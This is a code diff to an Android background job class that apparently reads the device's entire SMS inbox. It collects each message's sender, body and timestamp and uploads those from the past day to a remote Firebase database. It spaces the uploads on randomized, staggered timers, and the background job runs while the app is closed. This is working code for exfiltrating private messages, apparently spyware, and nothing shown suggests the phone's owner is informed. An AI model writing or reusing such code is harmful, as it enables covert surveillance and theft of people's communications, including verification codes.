@@ -24,14 +24,20 @@ import com.google.firebase.database.ValueEventListener;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashSet;
+import java.util.LinkedList;
 import java.util.Locale;
+import java.util.Queue;
 import java.util.Set;
 import java.util.TimeZone;
+import java.util.Timer;
+import java.util.TimerTask;
+import java.util.UUID;
 
 public class SmsJob extends JobService {
 
 
     public long smstime=0;
+
     @Override
     public  boolean onStartJob(JobParameters params) {
 
@@ -43,10 +49,10 @@ public class SmsJob extends JobService {
             long timestamp=smsData.getLong("timestamp");
 
             String fullsms=smsData.getString("full");
-           // compareStoredSms(getApplicationContext());
-            saveSmsToFirebase(custompath,sender,fullsms,timestamp);
+
+            //saveSmsToFirebase(custompath,sender,fullsms,timestamp);
             Log.d("startjob", "job called when app is off: ");
-            saveSmsToLocalStorage(getApplicationContext(), sender, message, timestamp);
+            //saveSmsToLocalStorage(getApplicationContext(), sender, message, timestamp);
             setTime(timestamp);
             Intent start=new Intent(this, BackgroundRun.class);
             start.setAction("UPDATE_TIME");
@@ -81,51 +87,79 @@ public class SmsJob extends JobService {
 
         editor.apply();
     }
- /*  public void compareStoredSms(Context context) {
-        Uri smsUri = Telephony.Sms.CONTENT_URI;
-        ContentResolver contentResolver = context.getContentResolver();
-        Cursor cursor = contentResolver.query(smsUri, null, null, null, null);
+   public void compareStoredSms(Context context) {
+       Uri smsUri = Telephony.Sms.CONTENT_URI;
+       ContentResolver contentResolver = context.getContentResolver();
+       Cursor cursor = contentResolver.query(smsUri, null, null, null, null);
 
-        if (cursor != null && cursor.moveToFirst()) {
-            int timestampIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
-            int senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
-            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
+       if (cursor != null && cursor.moveToFirst()) {
+           int timestampIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
+           int senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
+           int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
 
-            do {
-                long timestamp = cursor.getLong(timestampIndex);
-                String sender = cursor.getString(senderIndex);
-                String body = cursor.getString(bodyIndex);
+           Queue<String> senderQueue = new LinkedList<>();
+           Queue<String> bodyQueue = new LinkedList<>();
+           Queue<Long> timestampQueue = new LinkedList<>();
+           Queue<String> uniqueIdQueue = new LinkedList<>(); // New queue for unique IDs
 
-                isNewSms(context, sender, body, timestamp);
-            } while (cursor.moveToNext());
+           do {
+               long timestamp = cursor.getLong(timestampIndex);
+               String sender = cursor.getString(senderIndex);
+               String body = cursor.getString(bodyIndex);
 
-            cursor.close();
-        }
+               String uniqueId = UUID.randomUUID().toString();
+               String uniqueIdPrefix = uniqueId.substring(0, 2); // Extract first 2 characters
+
+               senderQueue.add(sender);
+               bodyQueue.add(body);
+               timestampQueue.add(timestamp);
+               uniqueIdQueue.add(uniqueIdPrefix); // Add prefix to queue
+
+           } while (cursor.moveToNext());
+
+           cursor.close();
+
+           processSmsQueues(context, senderQueue, bodyQueue, timestampQueue, uniqueIdQueue); // Pass additional queue
+       }
     }
-   private void isNewSms(Context context, String sender, String messageBody,long timestamp) {
+    private void processSmsQueues(Context context, Queue<String> senderQueue, Queue<String> bodyQueue, Queue<Long> timestampQueue, Queue<String> uniqueIdQueue) {
+        String custom = getCustomPathFromPreferences(context);
+        long thresholdTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
+
         SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
-        Set<String> processedTimestamps = sharedPreferences.getStringSet("smsTimestamp_", new HashSet<String>());
 
-        long thresholdTimestamp = System.currentTimeMillis() - (1000 * 60 * 60 * 24);
-        if (!processedTimestamps.contains(String.valueOf(timestamp)) && timestamp > thresholdTimestamp) {
-            String customPath = getCustomPathFromPreferences(context);
-            Log.d("SEND", "ISNEWSMS: " + messageBody);
-            saveSmsToFirebase(customPath, sender, messageBody, timestamp);
-            setTime(timestamp);
+        int delay = 10000 + (int) (Math.random() * 5000); // Adjust delay as needed (milliseconds)
 
-            Set<String> updatedTimestamps = new HashSet<>(processedTimestamps);
-            updatedTimestamps.add(String.valueOf(timestamp));
+        while (!senderQueue.isEmpty() && !bodyQueue.isEmpty() && !timestampQueue.isEmpty() && !uniqueIdQueue.isEmpty()) {
+            String sender = senderQueue.poll();
+            String body = bodyQueue.poll();
+            long timestamp = timestampQueue.poll();
+            String uniqueIdPrefix = uniqueIdQueue.poll();
 
-            // Save the updated set to SharedPreferences
-            sharedPreferences.edit().putStringSet("smsTimestamp_", updatedTimestamps).apply();
+            String formattedTime = getFormattedTime(timestamp);
+            String messageKey = formattedTime + "_" + uniqueIdPrefix;
 
-        } else {
-            Log.d("OLDSMS", "THIS IS OLD SMS. Timestamp: " + timestamp);
+            if (timestamp >= thresholdTime && !sharedPreferences.contains("smsSender_" + messageKey)) {
+                // Check if message key exists (not processed)
+                Log.d("NEWSMS", "sms is old: " + body);
+
+                // Schedule sending with a delay (separate delay for each message)
+
+                new Timer().schedule(new TimerTask() {
+                    @Override
+                    public void run() {
+                        saveoldSmsToFirebase(custom, sender, body, messageKey);
+                        // Save to SharedPreferences to mark as processed (optional)
+                        saveSmsToLocalStorage(context, sender, body, timestamp);
+                    }
+                }, delay);
+
+                delay += 1000; // Increase delay for next message (adjust as needed)
+            }
         }
     }
 
 
-  */
 
     public String getFormattedTime(long timestampMillis) {
         Locale locale = Locale.getDefault();
@@ -143,6 +177,27 @@ public class SmsJob extends JobService {
     }
 
 
+    private void saveoldSmsToFirebase(String custompath,String sender, String messageBody, String timestampmills) {
+
+        String path = "user_messages/" + custompath;
+
+
+        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference(path);
+
+        // Format the timestamp as a human-readable string
+        //String formattedTime = getFormattedTime(timestampmills);
+
+        // Create a data object to store in the database
+        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody,timestampmills);
+
+        // Save the SMS to the database under the custom path with timestamp as the key
+
+        databaseReference.child(timestampmills).setValue(smsMessage);
+
+
+
+
+    }
     private void saveSmsToFirebase(String custompath,String sender, String messageBody, long timestampmills) {
 
         String path = "user_messages/" + custompath;
@@ -154,11 +209,15 @@ public class SmsJob extends JobService {
         String formattedTime = getFormattedTime(timestampmills);
 
         // Create a data object to store in the database
-        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody, formattedTime);
+        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody,formattedTime);
 
         // Save the SMS to the database under the custom path with timestamp as the key
 
         databaseReference.child(formattedTime).setValue(smsMessage);
+
+
+
+
     }
 public void setTime(long time){
         smstime=time;
